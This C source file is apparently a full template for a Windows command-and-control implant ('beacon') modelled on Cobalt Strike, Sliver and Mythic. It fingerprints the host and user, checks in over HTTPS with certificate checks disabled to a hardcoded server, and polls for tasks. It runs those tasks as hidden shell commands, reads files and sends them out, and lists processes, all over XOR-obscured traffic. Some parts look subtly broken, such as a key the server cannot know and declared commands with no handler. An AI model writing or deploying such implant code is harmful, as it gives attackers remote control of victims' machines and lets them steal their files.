/*
 * Beacon Architecture - Full implant template
 * Cobalt Strike, Sliver, Mythic patterns
 */

#include <windows.h>
#include <winhttp.h>

#pragma comment(lib, "winhttp.lib")

// ============================================================================
// CONFIG
// ============================================================================

#pragma pack(push,1)
typedef struct {
    char     host[256];
    WORD     port;
    char     uri[128];
    DWORD    sleep;
    BYTE     jitter;
    BYTE     key[32];
    DWORD    bid;
} CFG;

typedef struct {
    DWORD magic;
    DWORD bid;
    WORD  type;
    WORD  flags;
    DWORD len;
} MSG_HDR;

typedef struct {
    DWORD os;
    DWORD arch;
    DWORD pid;
    DWORD integ;
    char  host[64];
    char  user[64];
    char  dom[64];
    char  proc[128];
    BYTE  ip[4];
} CHECKIN;

typedef struct {
    DWORD tid;
    WORD  cmd;
    WORD  flags;
    DWORD len;
} TASK;

typedef struct {
    DWORD tid;
    DWORD status;
    DWORD len;
} RESULT;
#pragma pack(pop)

// Types
#define T_CHECKIN  0x01
#define T_BEACON   0x02
#define T_TASK     0x03
#define T_RESULT   0x04
#define T_EXIT     0xFF

// Commands
#define C_NOP      0x00
#define C_SLEEP    0x01
#define C_EXIT     0x02
#define C_SHELL    0x10
#define C_UPLOAD   0x24
#define C_DOWNLOAD 0x25
#define C_PS       0x30
#define C_INJECT   0x32

// ============================================================================
// GLOBALS
// ============================================================================

CFG g_cfg = {
    .host = "192.168.1.100",
    .port = 443,
    .uri = "/api/v1/beacon",
    .sleep = 5000,
    .jitter = 20,
    .key = {0},
    .bid = 0
};

BOOL g_run = 1;

// ============================================================================
// CRYPTO
// ============================================================================

void xor_crypt(BYTE* d, DWORD l, BYTE* k, DWORD kl)
{
    for(DWORD i = 0; i < l; i++) d[i] ^= k[i % kl];
}

// ============================================================================
// HTTP
// ============================================================================

BOOL http_post(BYTE* data, DWORD len, BYTE** out, DWORD* olen)
{
    HINTERNET hS = 0, hC = 0, hR = 0;
    BOOL ret = 0;

    WCHAR whost[256], wuri[128];
    MultiByteToWideChar(0, 0, g_cfg.host, -1, whost, 256);
    MultiByteToWideChar(0, 0, g_cfg.uri, -1, wuri, 128);

    hS = WinHttpOpen(L"Mozilla/5.0", 0, 0, 0, 0);
    if(!hS) goto end;

    hC = WinHttpConnect(hS, whost, g_cfg.port, 0);
    if(!hC) goto end;

    hR = WinHttpOpenRequest(hC, L"POST", wuri, 0, 0, 0, 0x800000);
    if(!hR) goto end;

    DWORD sslf = 0x3300;
    WinHttpSetOption(hR, 31, &sslf, sizeof(sslf));

    if(!WinHttpSendRequest(hR, 0, 0, data, len, len, 0)) goto end;
    if(!WinHttpReceiveResponse(hR, 0)) goto end;

    DWORD sz = 0;
    WinHttpQueryDataAvailable(hR, &sz);

    if(sz > 0) {
        *out = HeapAlloc(GetProcessHeap(), 0, sz);
        WinHttpReadData(hR, *out, sz, olen);
        ret = 1;
    }

end:
    if(hR) WinHttpCloseHandle(hR);
    if(hC) WinHttpCloseHandle(hC);
    if(hS) WinHttpCloseHandle(hS);
    return ret;
}

// ============================================================================
// SYSINFO
// ============================================================================

void get_info(CHECKIN* c)
{
    OSVERSIONINFOW ov = {sizeof(ov)};
    GetVersionExW(&ov);
    c->os = (ov.dwMajorVersion << 16) | ov.dwMinorVersion;

#ifdef _WIN64
    c->arch = 64;
#else
    c->arch = 32;
#endif

    c->pid = GetCurrentProcessId();

    HANDLE hT;
    if(OpenProcessToken(GetCurrentProcess(), 8, &hT)) {
        DWORD len;
        GetTokenInformation(hT, 25, 0, 0, &len);
        BYTE* buf = HeapAlloc(GetProcessHeap(), 0, len);
        if(GetTokenInformation(hT, 25, buf, len, &len)) {
            TOKEN_MANDATORY_LABEL* tml = (TOKEN_MANDATORY_LABEL*)buf;
            c->integ = *GetSidSubAuthority(tml->Label.Sid,
                       *GetSidSubAuthorityCount(tml->Label.Sid) - 1);
        }
        HeapFree(GetProcessHeap(), 0, buf);
        CloseHandle(hT);
    }

    DWORD sz = sizeof(c->host);
    GetComputerNameA(c->host, &sz);

    sz = sizeof(c->user);
    GetUserNameA(c->user, &sz);

    GetModuleFileNameA(0, c->proc, sizeof(c->proc));
}

// ============================================================================
// CHECKIN
// ============================================================================

BOOL do_checkin(void)
{
    CHECKIN info = {0};
    get_info(&info);

    DWORD mlen = sizeof(MSG_HDR) + sizeof(CHECKIN);
    BYTE* msg = HeapAlloc(GetProcessHeap(), 0, mlen);

    MSG_HDR* hdr = (MSG_HDR*)msg;
    hdr->magic = 0xDEADBEEF;
    hdr->bid = 0;
    hdr->type = T_CHECKIN;
    hdr->len = sizeof(CHECKIN);

    BYTE* payload = msg + sizeof(MSG_HDR);
    for(DWORD i = 0; i < sizeof(CHECKIN); i++)
        payload[i] = ((BYTE*)&info)[i];

    xor_crypt(payload, sizeof(CHECKIN), g_cfg.key, 32);

    BYTE* resp = 0;
    DWORD rlen = 0;

    BOOL ok = http_post(msg, mlen, &resp, &rlen);

    if(ok && rlen >= sizeof(MSG_HDR)) {
        xor_crypt(resp, rlen, g_cfg.key, 32);
        MSG_HDR* rhdr = (MSG_HDR*)resp;
        g_cfg.bid = rhdr->bid;
    }

    HeapFree(GetProcessHeap(), 0, msg);
    if(resp) HeapFree(GetProcessHeap(), 0, resp);

    return ok && g_cfg.bid != 0;
}

// ============================================================================
// TASK HANDLERS
// ============================================================================

DWORD cmd_shell(BYTE* arg, DWORD alen, BYTE* out, DWORD maxout)
{
    SECURITY_ATTRIBUTES sa = {sizeof(sa), 0, 1};
    HANDLE hR, hW;
    CreatePipe(&hR, &hW, &sa, 0);

    STARTUPINFOA si = {sizeof(si)};
    PROCESS_INFORMATION pi;
    si.dwFlags = 0x100;
    si.hStdOutput = hW;
    si.hStdError = hW;

    char cmd[512];
    char* p = cmd;
    char* s = "cmd.exe /c ";
    while(*s) *p++ = *s++;
    for(DWORD i = 0; i < alen && i < 400; i++) *p++ = arg[i];
    *p = 0;

    DWORD total = 0;
    if(CreateProcessA(0, cmd, 0, 0, 1, 0x08000000, 0, 0, &si, &pi)) {
        CloseHandle(hW);
        DWORD rd;
        while(ReadFile(hR, out + total, maxout - total, &rd, 0) && rd)
            total += rd;
        WaitForSingleObject(pi.hProcess, 30000);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
    CloseHandle(hR);
    return total;
}

DWORD cmd_download(BYTE* arg, DWORD alen, BYTE* out, DWORD maxout)
{
    arg[alen] = 0;
    HANDLE hF = CreateFileA((char*)arg, 0x80000000, 1, 0, 3, 0, 0);
    if(hF == INVALID_HANDLE_VALUE) return 0;

    DWORD sz = GetFileSize(hF, 0);
    if(sz > maxout) sz = maxout;

    DWORD rd;
    ReadFile(hF, out, sz, &rd, 0);
    CloseHandle(hF);
    return rd;
}

DWORD cmd_ps(BYTE* out, DWORD maxout)
{
    HANDLE snap = CreateToolhelp32Snapshot(2, 0);  // TH32CS_SNAPPROCESS
    PROCESSENTRY32 pe = {sizeof(pe)};

    char* p = (char*)out;
    DWORD pos = 0;

    if(Process32First(snap, &pe)) {
        do {
            int i = pe.th32ProcessID;
            char num[16];
            int j = 15;
            num[j] = 0;
            if(i == 0) num[--j] = '0';
            while(i) { num[--j] = '0' + (i % 10); i /= 10; }

            while(num[j] && pos < maxout) p[pos++] = num[j++];
            p[pos++] = ' '; p[pos++] = ' ';
            char* n = pe.szExeFile;
            while(*n && pos < maxout) p[pos++] = *n++;
            p[pos++] = '\n';
        } while(Process32Next(snap, &pe) && pos < maxout - 256);
    }

    CloseHandle(snap);
    return pos;
}

// ============================================================================
// TASK DISPATCHER
// ============================================================================

void exec_task(TASK* t, BYTE** out, DWORD* olen)
{
    DWORD maxout = 0x10000;
    BYTE* result = HeapAlloc(GetProcessHeap(), 8, sizeof(RESULT) + maxout);
    RESULT* r = (RESULT*)result;
    r->tid = t->tid;
    r->status = 0;
    r->len = 0;

    BYTE* data = result + sizeof(RESULT);

    switch(t->cmd) {
        case C_NOP:
            break;

        case C_SLEEP:
            if(t->len >= 4) g_cfg.sleep = *(DWORD*)((BYTE*)t + sizeof(TASK));
            break;

        case C_EXIT:
            g_run = 0;
            break;

        case C_SHELL:
            r->len = cmd_shell((BYTE*)t + sizeof(TASK), t->len, data, maxout);
            break;

        case C_DOWNLOAD:
            r->len = cmd_download((BYTE*)t + sizeof(TASK), t->len, data, maxout);
            break;

        case C_PS:
            r->len = cmd_ps(data, maxout);
            break;

        default:
            r->status = 1;
    }

    *out = result;
    *olen = sizeof(RESULT) + r->len;
}

// ============================================================================
// MAIN LOOP
// ============================================================================

DWORD get_sleep(void)
{
    DWORD base = g_cfg.sleep;
    DWORD range = (base * g_cfg.jitter) / 100;
    DWORD jitter = GetTickCount() % (range * 2 + 1);
    return base - range + jitter;
}

void beacon_loop(void)
{
    while(g_run) {
        Sleep(get_sleep());

        DWORD mlen = sizeof(MSG_HDR);
        BYTE* msg = HeapAlloc(GetProcessHeap(), 0, mlen);

        MSG_HDR* hdr = (MSG_HDR*)msg;
        hdr->magic = 0xDEADBEEF;
        hdr->bid = g_cfg.bid;
        hdr->type = T_BEACON;
        hdr->len = 0;

        BYTE* resp = 0;
        DWORD rlen = 0;

        if(http_post(msg, mlen, &resp, &rlen)) {
            xor_crypt(resp, rlen, g_cfg.key, 32);

            BYTE* ptr = resp;
            while(ptr < resp + rlen) {
                MSG_HDR* th = (MSG_HDR*)ptr;
                if(th->magic != 0xDEADBEEF) break;

                if(th->type == T_TASK) {
                    TASK* task = (TASK*)(ptr + sizeof(MSG_HDR));

                    BYTE* result;
                    DWORD result_len;
                    exec_task(task, &result, &result_len);

                    DWORD res_mlen = sizeof(MSG_HDR) + result_len;
                    BYTE* res_msg = HeapAlloc(GetProcessHeap(), 0, res_mlen);

                    MSG_HDR* rh = (MSG_HDR*)res_msg;
                    rh->magic = 0xDEADBEEF;
                    rh->bid = g_cfg.bid;
                    rh->type = T_RESULT;
                    rh->len = result_len;

                    for(DWORD i = 0; i < result_len; i++)
                        res_msg[sizeof(MSG_HDR) + i] = result[i];

                    xor_crypt(res_msg + sizeof(MSG_HDR), result_len, g_cfg.key, 32);

                    BYTE* dummy;
                    DWORD dlen;
                    http_post(res_msg, res_mlen, &dummy, &dlen);

                    HeapFree(GetProcessHeap(), 0, result);
                    HeapFree(GetProcessHeap(), 0, res_msg);
                }

                ptr += sizeof(MSG_HDR) + th->len;
            }

            HeapFree(GetProcessHeap(), 0, resp);
        }

        HeapFree(GetProcessHeap(), 0, msg);
    }
}

// ============================================================================
// ENTRY
// ============================================================================

void beacon_start(void)
{
    // Init key
    DWORD tick = GetTickCount();
    for(int i = 0; i < 32; i++)
        g_cfg.key[i] = (BYTE)((tick >> (i % 4) * 8) ^ i);

    if(!do_checkin()) return;

    beacon_loop();
}

// ============================================================================
// EOF
// ============================================================================
